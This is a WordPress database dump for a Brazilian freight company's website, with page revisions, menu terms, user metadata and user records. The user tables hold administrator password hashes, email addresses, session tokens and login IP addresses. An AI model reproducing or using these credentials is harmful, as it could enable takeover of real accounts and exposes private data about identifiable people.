INSERT INTO `wp_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(171, 1, '2015-04-10 15:12:57', '2015-04-10 18:12:57', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional;</li>\r\n</ul>\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-10 15:12:57', '2015-04-10 18:12:57', '', 96, 'http://www.araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(172, 1, '2015-04-10 23:58:55', '2015-04-11 02:58:55', '', 'encomenda-entregue', '', 'inherit', 'open', 'open', '', 'encomenda-entregue-2', '', '', '2015-04-10 23:58:55', '2015-04-11 02:58:55', '', 0, 'http://www.araujotrans.com.br/wp-content/uploads/2015/04/encomenda-entregue.jpg', 0, 'attachment', 'image/jpeg', 0),
(173, 1, '2015-04-11 00:10:01', '2015-04-11 03:10:01', '', 'box_joaninha', '', 'inherit', 'open', 'open', '', 'box_joaninha', '', '', '2015-04-11 00:12:00', '2015-04-11 03:12:00', '', 91, 'http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha.jpg', 0, 'attachment', 'image/jpeg', 0),
(174, 1, '2015-04-11 00:10:48', '2015-04-11 03:10:48', '', 'joaninha', '', 'inherit', 'open', 'open', '', 'joaninha', '', '', '2015-04-11 00:12:49', '2015-04-11 03:12:49', '', 91, 'http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha.jpg', 0, 'attachment', 'image/jpeg', 0),
(175, 1, '2015-04-11 00:14:03', '2015-04-11 03:14:03', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-300x300.jpg\" /></a></div>\r\n\r\n\r\n<a href=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha.jpg\"><img src=\"\" alt=\"joaninha\" width=\"300\" height=\"300\" class=\"alignnone size-medium wp-image-174\" /></a>', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-11 00:14:03', '2015-04-11 03:14:03', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(176, 1, '2015-04-11 00:14:49', '2015-04-11 03:14:49', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n\r\n\r\n<a href=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha.jpg\"><img src=\"\" alt=\"joaninha\" width=\"300\" height=\"300\" class=\"alignnone size-medium wp-image-174\" /></a>', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-11 00:14:49', '2015-04-11 03:14:49', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(177, 1, '2015-04-11 00:15:18', '2015-04-11 03:15:18', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-11 00:15:18', '2015-04-11 03:15:18', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(178, 1, '2015-04-11 00:16:46', '2015-04-11 03:16:46', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"#http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-11 00:16:46', '2015-04-11 03:16:46', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(179, 1, '2015-04-11 00:22:41', '2015-04-11 03:22:41', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-11 00:22:41', '2015-04-11 03:22:41', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(181, 1, '2015-04-15 14:47:22', '2015-04-15 17:47:22', '', 'Naked', '', 'inherit', 'open', 'open', '', 'naked', '', '', '2015-04-15 14:47:22', '2015-04-15 17:47:22', '', 91, 'http://www.araujotrans.com.br/wp-content/uploads/2015/03/Naked.jpg', 0, 'attachment', 'image/jpeg', 0),
(182, 1, '2015-04-15 14:48:04', '2015-04-15 17:48:04', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.sorvetenaked.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/03/Naked-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-15 14:48:04', '2015-04-15 17:48:04', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(185, 2, '2016-07-11 11:13:47', '2016-07-11 14:13:47', '<strong>Venha nos visitar!</strong>\r\n\r\nRua Amaro Leite,374\r\n<strong>CEP:</strong> 04763-060 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong> (11) 25971454 / (11) 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'closed', 'closed', '', '85-revision-v1', '', '', '2016-07-11 11:13:47', '2016-07-11 14:13:47', '', 85, 'http://www.araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(188, 1, '2016-07-30 17:18:49', '2016-07-30 20:18:49', '<strong>Venha nos visitar!</strong>\r\n\r\nRua Amaro Leite, 374\r\n<strong>CEP:</strong> 04763-060 - Socorro, São Paulo/SP\r\n<strong>Tel:</strong> (11) 25971454 / (11) 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'closed', 'closed', '', '85-revision-v1', '', '', '2016-07-30 17:18:49', '2016-07-30 20:18:49', '', 85, 'http://www.araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(189, 1, '2016-07-30 17:19:12', '2016-07-30 20:19:12', '<strong>Venha nos visitar!</strong>\r\n\r\nRua Amaro Leite, 374\r\n<strong>CEP:</strong> 04763-060 – Socorro, São Paulo/SP\r\n<strong>Tel:</strong> (11) 25971454 / (11) 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'inherit', 'closed', 'closed', '', '85-revision-v1', '', '', '2016-07-30 17:19:12', '2016-07-30 20:19:12', '', 85, 'http://www.araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0);

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_termmeta`
--

CREATE TABLE `wp_termmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `term_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_terms`
--

CREATE TABLE `wp_terms` (
  `term_id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `slug` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `term_group` bigint(10) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_terms`
--

INSERT INTO `wp_terms` (`term_id`, `name`, `slug`, `term_group`) VALUES
(1, 'Sem categoria', 'sem-categoria', 0),
(2, 'header', 'header', 0),
(3, 'footer', 'footer', 0);

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_term_relationships`
--

CREATE TABLE `wp_term_relationships` (
  `object_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `term_order` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_term_relationships`
--

INSERT INTO `wp_term_relationships` (`object_id`, `term_taxonomy_id`, `term_order`) VALUES
(35, 2, 0),
(37, 2, 0),
(38, 2, 0),
(83, 3, 0),
(87, 2, 0),
(88, 3, 0),
(98, 2, 0),
(160, 2, 0);

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_term_taxonomy`
--

CREATE TABLE `wp_term_taxonomy` (
  `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL,
  `term_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `taxonomy` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `description` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `parent` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `count` bigint(20) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_term_taxonomy`
--

INSERT INTO `wp_term_taxonomy` (`term_taxonomy_id`, `term_id`, `taxonomy`, `description`, `parent`, `count`) VALUES
(1, 1, 'category', '', 0, 0),
(2, 2, 'nav_menu', '', 0, 6),
(3, 3, 'nav_menu', '', 0, 2);

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_usermeta`
--

CREATE TABLE `wp_usermeta` (
  `umeta_id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_usermeta`
--

INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES
(1, 1, 'nickname', 'admin'),
(2, 1, 'first_name', ''),
(3, 1, 'last_name', ''),
(4, 1, 'description', ''),
(5, 1, 'rich_editing', 'true'),
(6, 1, 'comment_shortcuts', 'false'),
(7, 1, 'admin_color', 'sunrise'),
(8, 1, 'use_ssl', '0'),
(9, 1, 'show_admin_bar_front', 'false'),
(10, 1, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
(11, 1, 'wp_user_level', '10'),
(12, 1, 'dismissed_wp_pointers', 'wp350_media,wp360_revisions,wp360_locks,wp390_widgets,wmp-clifden-01,wp410_dfw'),
(13, 1, 'show_welcome_panel', '1'),
(14, 1, 'session_tokens', 'a:1:{s:64:\"a8a342fd017a557f46b13ac03651f38f57adf37c9b130e9453458b3c0e9945ca\";a:4:{s:10:\"expiration\";i:1548253723;s:2:\"ip\";s:13:\"179.54.129.59\";s:2:\"ua\";s:114:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\";s:5:\"login\";i:1548080923;}}'),
(15, 1, 'wp_dashboard_quick_press_last_post_id', '190'),
(16, 1, 'managenav-menuscolumnshidden', 'a:4:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";}'),
(17, 1, 'metaboxhidden_nav-menus', 'a:3:{i:0;s:8:\"add-post\";i:1;s:12:\"add-post_tag\";i:2;s:15:\"add-post_format\";}'),
(18, 1, 'wp_user-settings', 'libraryContent=browse&editor=html&imgsize=medium'),
(19, 1, 'wp_user-settings-time', '1428722039'),
(20, 1, 'nav_menu_recently_edited', '2'),
(21, 2, 'nickname', 'araujotrans'),
(22, 2, 'first_name', 'Araujo Transportes'),
(23, 2, 'last_name', ''),
(24, 2, 'description', ''),
(25, 2, 'rich_editing', 'true'),
(26, 2, 'comment_shortcuts', 'false'),
(27, 2, 'admin_color', 'sunrise'),
(28, 2, 'use_ssl', '0'),
(29, 2, 'show_admin_bar_front', 'false'),
(30, 2, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'),
(31, 2, 'wp_user_level', '10'),
(32, 2, 'dismissed_wp_pointers', 'wp360_locks,wp390_widgets,wp496_privacy'),
(34, 2, 'wp_dashboard_quick_press_last_post_id', '190'),
(35, 2, 'closedpostboxes_dashboard', 'a:0:{}'),
(36, 2, 'metaboxhidden_dashboard', 'a:3:{i:0;s:18:\"dashboard_activity\";i:1;s:21:\"dashboard_quick_press\";i:2;s:17:\"dashboard_primary\";}'),
(37, 2, 'meta-box-order_dashboard', 'a:4:{s:6:\"normal\";s:38:\"dashboard_right_now,dashboard_activity\";s:4:\"side\";s:39:\"dashboard_quick_press,dashboard_primary\";s:7:\"column3\";s:0:\"\";s:7:\"column4\";s:0:\"\";}'),
(39, 1, 'closedpostboxes_page', 'a:0:{}'),
(40, 1, 'metaboxhidden_page', 'a:7:{i:0;s:12:\"revisionsdiv\";i:1;s:11:\"postexcerpt\";i:2;s:10:\"postcustom\";i:3;s:16:\"commentstatusdiv\";i:4;s:11:\"commentsdiv\";i:5;s:7:\"slugdiv\";i:6;s:9:\"authordiv\";}'),
(41, 2, 'session_tokens', 'a:1:{s:64:\"90d44599902afb73545ec6d908417fc65073e3ccf7f0aa183954edca34654385\";a:4:{s:10:\"expiration\";i:1565196176;s:2:\"ip\";s:13:\"201.52.85.167\";s:2:\"ua\";s:102:\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36\";s:5:\"login\";i:1565023376;}}'),
(42, 2, 'closedpostboxes_page', 'a:2:{i:0;s:13:\"pageparentdiv\";i:1;s:12:\"postimagediv\";}'),
(43, 2, 'metaboxhidden_page', 'a:7:{i:0;s:12:\"revisionsdiv\";i:1;s:11:\"postexcerpt\";i:2;s:10:\"postcustom\";i:3;s:16:\"commentstatusdiv\";i:4;s:11:\"commentsdiv\";i:5;s:7:\"slugdiv\";i:6;s:9:\"authordiv\";}'),
(44, 2, 'wp_user-settings', 'libraryContent=browse&mfold=f&editor=tinymce'),
(45, 2, 'wp_user-settings-time', '1468246423'),
(46, 2, 'wp_media_library_mode', 'grid'),
(47, 2, 'nav_menu_recently_edited', '3'),
(48, 2, 'managenav-menuscolumnshidden', 'a:5:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";i:4;s:15:\"title-attribute\";}'),
(49, 2, 'metaboxhidden_nav-menus', 'a:1:{i:0;s:12:\"add-post_tag\";}'),
(50, 1, 'community-events-location', 'a:1:{s:2:\"ip\";s:12:\"179.54.129.0\";}');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_users`
--

CREATE TABLE `wp_users` (
  `ID` bigint(20) UNSIGNED NOT NULL,
  `user_login` varchar(60) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_pass` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_nicename` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_url` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_registered` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `user_activation_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_status` int(11) NOT NULL DEFAULT '0',
  `display_name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_users`
--

INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES
(1, 'admin', '$P$B.Qn1md1Rd3t4qkNSZ3zGKjKLbQD5r0', 'admin', 'marjori@ywc.com.br', '', '2015-03-06 20:18:27', '', 0, 'admin'),
(2, 'araujotrans', '$P$BOhHZXtd1PIJxStqU5e.7gQbMmCNnS1', 'araujotrans', 'contato@araujotrans.com.br', '', '2015-04-08 22:40:39', '', 0, 'Araujo Transportes');

--
-- Índices de tabelas apagadas
--

--
-- Índices de tabela `wp_commentmeta`
--
ALTER TABLE `wp_commentmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `comment_id` (`comment_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Índices de tabela `wp_comments`
--
ALTER TABLE `wp_comments`
  ADD PRIMARY KEY (`comment_ID`),
  ADD KEY `comment_post_ID` (`comment_post_ID`),
  ADD KEY `comment_approved_date_gmt` (`comment_approved`,`comment_date_gmt`),
  ADD KEY `comment_date_gmt` (`comment_date_gmt`),
  ADD KEY `comment_parent` (`comment_parent`),
  ADD KEY `comment_author_email` (`comment_author_email`(10));

--
-- Índices de tabela `wp_create_map`
--
ALTER TABLE `wp_create_map`
  ADD PRIMARY KEY (`map_id`);

--
-- Índices de tabela `wp_group_map`
--
ALTER TABLE `wp_group_map`
  ADD PRIMARY KEY (`group_map_id`);

--
-- Índices de tabela `wp_g_circles`
--
ALTER TABLE `wp_g_circles`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `wp_g_maps`
--
ALTER TABLE `wp_g_maps`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `wp_g_markers`
--
ALTER TABLE `wp_g_markers`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `wp_g_polygones`
--
ALTER TABLE `wp_g_polygones`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `wp_g_polylines`
--
ALTER TABLE `wp_g_polylines`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `wp_links`
--
ALTER TABLE `wp_links`
  ADD PRIMARY KEY (`link_id`),
  ADD KEY `link_visible` (`link_visible`);

--
-- Índices de tabela `wp_map_locations`
--
ALTER TABLE `wp_map_locations`
  ADD PRIMARY KEY (`location_id`);

--
-- Índices de tabela `wp_options`
--
ALTER TABLE `wp_options`
  ADD PRIMARY KEY (`option_id`),
  ADD UNIQUE KEY `option_name` (`option_name`);

--
-- Índices de tabela `wp_postmeta`
--
ALTER TABLE `wp_postmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `post_id` (`post_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Índices de tabela `wp_posts`
--
ALTER TABLE `wp_posts`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `type_status_date` (`post_type`,`post_status`,`post_date`,`ID`),
  ADD KEY `post_parent` (`post_parent`),
  ADD KEY `post_author` (`post_author`),
  ADD KEY `post_name` (`post_name`(191));

--
-- Índices de tabela `wp_termmeta`
--
ALTER TABLE `wp_termmeta`
  ADD PRIMARY KEY (`meta_id`),
  ADD KEY `term_id` (`term_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Índices de tabela `wp_terms`
--
ALTER TABLE `wp_terms`
  ADD PRIMARY KEY (`term_id`),
  ADD KEY `slug` (`slug`(191)),
  ADD KEY `name` (`name`(191));

--
-- Índices de tabela `wp_term_relationships`
--
ALTER TABLE `wp_term_relationships`
  ADD PRIMARY KEY (`object_id`,`term_taxonomy_id`),
  ADD KEY `term_taxonomy_id` (`term_taxonomy_id`);

--
